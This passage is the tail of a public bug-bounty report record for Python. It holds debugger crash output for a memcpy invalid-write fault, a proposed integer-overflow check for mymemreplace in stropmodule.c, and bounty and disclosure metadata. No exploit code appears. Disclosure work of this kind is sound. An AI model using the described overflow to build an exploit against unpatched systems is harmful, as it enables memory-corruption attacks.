MSVCR90\u003c/p\u003e\n\n\u003cp\u003eIMAGE_NAME:  MSVCR90.dll\u003c/p\u003e\n\n\u003cp\u003eDEBUG_FLR_IMAGE_TIMESTAMP:  51ea24a5\u003c/p\u003e\n\n\u003cp\u003eFAILURE_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE_c0000005_MSVCR90.dll!memcpy\u003c/p\u003e\n\n\u003cp\u003eBUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE_msvcr90!memcpy+5a\u003c/p\u003e\n\n\u003cp\u003eANALYSIS_SOURCE:  UM\u003c/p\u003e\n\n\u003cp\u003eFAILURE_ID_HASH_STRING:  um:string_dereference_fill_pattern_nxcode_c0000005_msvcr90.dll!memcpy\u003c/p\u003e\n\n\u003cp\u003eFAILURE_ID_HASH:  {031149d8-0626-9042-d8b7-a1766b1c5514}\u003c/p\u003e\n\n\u003ch2 id=\"followup-machineowner\"\u003eFollowup: MachineOwner\u003c/h2\u003e\n\n\u003cp\u003eTo fix the issue, mymemreplace should validate that the computed value new_len has not overflowed. To do this, (new_len - len) / nfound should be compared to sub_len - pat_len. If that are not equal, an overflow has occurred. Proposed patches for stropmodule.c and test_strop.py are attached.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-05-30T22:47:09.298Z","allow_singular_disclosure_after":-144567437.06036255,"singular_disclosure_allowed":true,"vote_count":2,"voters":["dyabla","jaybosamiya"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":934956,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-30T22:46:58.828Z","updated_at":"2016-04-30T22:46:58.828Z","actor":{"url":"/ibb-python","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Python (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-python","collaborator":{"username":"johnleitch","url":"/johnleitch"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":934957,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-30T22:47:04.589Z","updated_at":"2016-04-30T22:47:04.589Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"johnleitch","url":"/johnleitch"},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":934958,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-30T22:47:09.248Z","updated_at":"2016-04-30T22:47:09.248Z","first_to_agree":true,"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":935780,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-02T05:21:33.848Z","updated_at":"2016-05-02T05:21:33.848Z","actor":{"username":"johnleitch","cleared":false,"url":"/johnleitch","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":935781,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-02T05:21:33.931Z","updated_at":"2016-05-02T05:21:33.931Z","actor":{"username":"johnleitch","cleared":false,"url":"/johnleitch","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-python","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}